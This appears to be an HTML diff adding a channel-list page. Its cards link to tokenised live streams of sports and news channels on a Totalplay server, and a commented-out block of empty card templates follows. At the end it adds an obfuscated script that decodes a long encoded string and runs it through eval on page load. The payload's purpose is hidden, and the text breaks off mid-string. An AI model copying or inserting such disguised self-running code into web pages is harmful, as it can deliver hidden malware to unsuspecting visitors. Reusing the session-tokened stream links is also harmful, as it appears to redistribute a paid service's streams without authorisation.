+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=180&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s34863_dark_360w_270h.png	"/> <h6>	AYM SPORTS	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=950&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s72625_dark_360w_270h.png	"/> <h6>	PXSports	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2157&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s57580_dark_360w_270h.png	"/> <h6>	TVC DEPORTES	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=169&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s17725_dark_360w_270h.png	"/> <h6>	ESPN	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=168&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s88735_dark_360w_270h.png	"/> <h6>	ESPN 2	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=345&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s25595_dark_360w_270h.png	"/> <h6>	ESPN 3	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=170&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s59307_dark_360w_270h.png	"/> <h6>	FOX SPORTS	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=172&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s71328_dark_360w_270h.png	"/> <h6>	FOX SPORTS 2	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=178&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s47374_dark_360w_270h.png	"/> <h6>	FOX SPORTS 3	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=2404&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s83162_dark_360w_270h.png	"/> <h6>	ADRENALINA SPORTS HD	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=179&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s61033_dark_360w_270h.png	"/> <h6>	GOLF	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=1252&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s61719_dark_360w_270h.png	"/> <h6>	MILENIO	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=700&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s66635_dark_360w_270h.png	"/> <h6>	FORO TV	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=184&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s15384_dark_360w_270h.png	"/> <h6>	ADN 40	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=1449&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s82353_dark_360w_270h.png	"/> <h6>	EXCELSIOR TV	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=185&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s58646_dark_360w_270h.png	"/> <h6>	CNN	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=187&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s17054_dark_360w_270h.png	"/> <h6>	CNN Ñ	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=188&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s110959_dark_360w_270h.png	"/> <h6>	FOX NEWS	</h6></a></li>
+<li> <a href="	https://totalgo.totalplay.com.mx:444/KAN-HLSWeb/liveAdaptive?s=hkc26at86kbpzzczca1k8tpbxazkck268p1xpcp1ztvcx8jj68bxhj61kzxtbkcjjbec2zzb2jbc8a616ta16paej1xzbk1kack2a8t18zpcajhxpa22bbzx8jzxbjhj8tjz8c2jzhjkcek68tkkzajeckbvevkxzkxpkpp68ah2x2aek1ta82bjvjjhvpcbxcxtptvx6zezt1tpb2eha1v6jc2xbvaptj662ve8ttkx22hzcbttxhpt1hva8txte18cza121ekp8te6tpj6kppeket2vzak&l=190&f=HLSAD&f=.m3u8	 " target="_blank"  class="card"> <img src="	http://schedulesdirect-api20141201-logos.s3.amazonaws.com/stationLogos/s101096_dark_360w_270h.png	"/> <h6>	BLOOMBERG	</h6></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                
+
+
+
+              <!-- 
+
+
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+                <li>
+                <a href="" target="_blank"  class="card">
+                    <img src=""/>
+
+                 <h6>            </h6></a></li>
+
+
+
+
+
+
+
+
+
+               -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+
+
+
+
+
+</ul></center><br>
+<script>
+var _0xc32e=["","split","0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/","slice","indexOf","","",".","pow","reduce","reverse","0"];function _0xe53c(d,e,f){var g=_0xc32e[2][_0xc32e[1]](_0xc32e[0]);var h=g[_0xc32e[3]](0,e);var i=g[_0xc32e[3]](0,f);var j=d[_0xc32e[1]](_0xc32e[0])[_0xc32e[10]]()[_0xc32e[9]](function(a,b,c){if(h[_0xc32e[4]](b)!==-1)return a+=h[_0xc32e[4]](b)*(Math[_0xc32e[8]](e,c))},0);var k=_0xc32e[0];while(j>0){k=i[j%f]+k;j=(j-(j%f))/f}return k||_0xc32e[11]}eval(function(h,u,n,t,e,r){r="";for(var i=0,len=h.length;i<len;i++){var s="";while(h[i]!==n[e]){s+=h[i];i++}for(var j=0;j<n.length;j++)s=s.replace(new RegExp(n[j],"g"),j);r+=String.fromCharCode(_0xe53c(s,e,10)-t)}return decodeURIComponent(escape(r))}("RLRvRMCvRqLvBRBvRBqvBLLvRLLvRMMvBLLvRMqvMMCvRBCvBRRvBRRvBLBvBRRvRLCvRqRvRRLvRRMvRLBvBRRvBLBvBRRvBLLvMCCvMCBvMCMvMCRvMCqvMCLvMBCvMBBvMBMvRMCvRMBvRMMvRMRvRMqvRMLvRRCvRRBvRRMvRRRvRRqvRRLvRqCvRqBvRqMvRqRvRqqvRqLvRLCvRLBvRLMvRLRvRLqvRLLvqCCvqCBvMMqvMMLvMRCvMRBvMRMvMRRvMRqvMRLvMqCvMqBvMqMvMqRvMqqvMqLvMLCvMLBvMLMvMLRvMLqvMLLvRCCvRCBvRCMvRCRvRCqvRCLvBLCvBLqvBRRvBLBvBRRvRLCvRRLvRRMvRMMvRMqvBRRvBLBvBRRvRRMvRqBvRMRvRMqvRLLvMLCvRMLvBRRvBLBvBRRvBRRvBLBvBRRvBRRvBLBvBRRvBLRvBRRvBLBvBRRvRqRvRqMvRLqvBRRvBLBvBRRvRqLvRMqvRMRvRLMvRMMvRMqvBRRvBLBvBRRvRqLvRMqvRLRvRMqvRqLvRLCvRMqvBRRvBLBvBRRvBLLvBRRvRBMvMBqvRMLvRLMvRqBvRMMvRLBvRRMvRqMvRqBvBRBvRBqvBLLvRLLvRMqvMCMvRMMvBqRvRMRvBLBvRMqvBLBvRMLvBqqvqCMvRLRvRMCvRqLvBRBvRRCvMMCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCBvRBMvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvRBMvRBMvBqRvRBqvBLLvRLLvRMMvBLLvRMqvRBCvBLLvRBMvBqqvMBqvRLRvRMCvRqLvBRBvRRBvMMCvRRCvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCMvRBMvRBMvBqRvBLLvBLBvRMqvBqqvMBqvRLRvRMCvRqLvBRBvRRMvMMCvRRCvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCMvRBMvRBMvBqRvBLLvBLBvRMLvBqqvMBqvRLRvRMCvRqLvBRBvRRRvMMCvRMRvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvRBMvRBMvBqRvRBqvBLLvRLLvRMMvBLLvRMqvRBCvBLLvRBMvBqqvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvBLLvRBMvRBMvBqRvBqqvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMBMvRBMvRBMvBqRvRMLvRLMvRqBvRMMvRLBvRRMvRqMvRqBvBqRvRMCvBLBvRMBvBLBvRMMvBqqvqCMvRRMvRMLvBqRvRRBvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCRvRBMvRBMvBqRvRMBvBqqvBRMvMMCvMMCvBLMvMCCvBqqvRqLvRMqvRLBvRLMvRqLvRqBvBRBvRMCvBLCvMMCvRRBvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCRvRBMvRBMvBqRvRMBvBqqvBqLvBqRvMqqvRMCvRLBvRRBvRBCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMBBvRBMvRBMvBqRvRMqvBLBvRMMvBqqvBqqvqCqvBLBvBLLvBqqvMBqvRLRvRMCvRqLvBRBvRRqvMMCvRBqvBLLvRLLvRMMvBLLvRMqvRBCvBLLvRBMvMBqvRLqvRRBvRRMvRRLvRMqvBqRvRRRvMMBvBLLvBqqvqCMvRRqvMMCvRRMvRBCvRRRvBqCvRMLvRBMvBLCvRRqvMBqvRRRvMMCvBqRvRRRvBLMvBqRvRRRvBqCvRMLvBqqvBqqvBLqvRMLvqCqvRqLvRMqvRLBvRLMvRqLvRqBvBRBvRRqvqCRvqCRvRBqvBLLvRLLvRMMvBLLvRMqvRBCvMCCvMCCvRBMvqCqvRMqvRLRvRMCvRRLvBqRvRMLvRLMvRqBvRMMvRLBvRRMvRqMvRqBvBqRvRRBvBLBvRLMvBLBvRqBvBLBvRLBvBLBvRMqvBLBvRqLvBqqvqCMvRqLvMMCvBRRvBRRvMBqvRMLvRqMvRqLvBqRvRLRvRMCvRqLvBRBvRRMvMMCvBLLvBLBvRRLvRMqvRqBvMMCvRRBvBLRvRRLvRMqvRqBvRRCvRLBvRRBvMBqvRRMvMBLvRRLvRMqvRqBvMBqvRRMvBLCvBLCvBqqvqCMvRLRvRMCvRqLvBRBvRLCvMMCvBRRvBRRvMBqvRLqvRRBvRRMvRRLvRMqvBqRvRRBvRBCvRRMvRBMvBRMvMMCvMMCvRqBvRBCvRMqvRBMvBqqvqCMvRLCvBLCvMMCvRRBvRBCvRRMvRBMvMBqvRRMvBLCvBLCvqCqvRMLvRqMvRqLvBqRvRLRvRMCvRqLvBRBvRRRvMMCvBLLvMBqvRRRvMBLvRqBvBLRvRRLvRMqvRqBvRRCvRLBvRRBvMBqvRRRvBLCvBLCvBqqvRLCvMMCvRLCvBLRvRqLvRMqvRqRvRRLvRMCvRMMvRMqvBqRvRqBvRMqvRLqvBRBvMLRvRMqvRRCvMRMvRLLvRqRvBqRvRqBvRBCvRRRvRBMvBLBvBRRvRRCvBRRvBqqvBLBvRRRvBqqvMBqvRqLvBLCvMMCvMLqvRLBvRqLvRRMvRqBvRRCvBLRvRMLvRqLvRqMvRqCvMRCvRRBvRMCvRqLvMRCvRqMvRMRvRMqvBqRvRBqvBLLvRLLvRMqvMCMvRMMvBqRvRLCvBLBvRMqvBLBvMCCvBLLvBqqvBLMvRLBvBqqvqCqvRqLvRMqvRLBvRLMvRqLvRqBvBRBvRMRvRMqvRMMvRqMvRMRvRMqvRCCvMLRvMqCvMRCvRqMvRqCvRqRvRqMvRqBvRMqvRqBvRLBvBqRvRMqvRLCvRMMvRMCvRqRvRMqvBqRvRqLvBqqvBqqvqCqvBqRvBRRvMLLvMLqvMLqvMLqvRMCvMLLvRqRvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLLvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvMLqvRMCvMLqvMLLvRMMvRMCvMLLvRqRvRMMvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRMMvMLqvMLqvRMCvMLLvRqRvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLLvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvMLqvRMCvMLqvRqRvRMMvRMCvMLqvRqRvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRqRvRqRvRqRvRMCvRqRvMLqvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLqvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLLvMLqvMLLvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLqvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRqRvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvMLqvRqRvMLLvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLqvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvMLLvMLLvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLqvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvMLqvRqRvRMMvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvMLqvRqRvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvRMMvMLqvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvRMMvRMMvRMCvMLLvRqRvRMMvRMMvRMCvRqRvRMMvRMMvRMCvMLqvMLLvRMMvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLLvRMCvRqRvRqRvRqRvRMCvRqRvMLqvRMCvMLLvMLqvMLqvMLqvRMCvMLLvRqRvRMMvRqRvRMCvMLLvRqRvMLLvMLqvRMCvMLqvMLLvRMMvRMCvMLqvRqRvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvRqRvRqRvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvMLqvRqRvMLLvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLqvRqRvRMMvRMCvMLLvRqRvMLLvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLLvMLqvMLLvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvMLLvRqRvRMCvMLLvRqRvMLqvRMMvRMCvMLLvMLqvRqRvRMMvRMCvMLLvMLqvRqRvMLLvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLqvMLLvRMMvRMCvMLLvRMMvRMMvMLLvRMCvMLqvMLLvRMMvRMCvMLLvMLqvMLqvRMMvRMCvMLLvRqRvRMMvRqRvRMCvMLLvMLqvMLLvRqRvRMCvMLLvRqRvMLqvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvRqRvRMMvMLqvRMCvMLLvMLqvMLqvRqRvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRMMvMLqvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLLvRMCvMLLvMLqvMLqvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRMCvMLLvRMMvMLLvMLqvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRMMvRqRvMLLvRMCvMLLvMLqvMLqvRMMvRMCvMLqvRqRvRMMvRMCvMLqvMLLvMLqvRMCvMLLvRqRvRMMvMLLvRMCvMLLvRqRvRqRvMLLvRMCvMLLvRMMvRqRvMLLvRMCvMLLvRqRvRMMvMLqvRMCvMLLvRqRvMLLvRMMvRMCvMLLvRqRvMLqvMLLvRMCvMLLvRqRvMLqvRMMvRMCvMLqvMLLvMLqvRMCvMLqvRqRvMLLvRMCvMLqvRqRvMLLvRMCvRqRvRMMvMLqvRMCvMLLvRqRvMLqvMLqvRMCvMLLvMLqvMLLvMLLvRMCvMLLvRqRvRMMvRMMvRMCvMLLvRqRvMLqvMLLvRMCvMLLvMLqvMLqvMLLvRMCvRqRvRMMvMLqvRMCvMLLvRqRvMLqvRMMvRM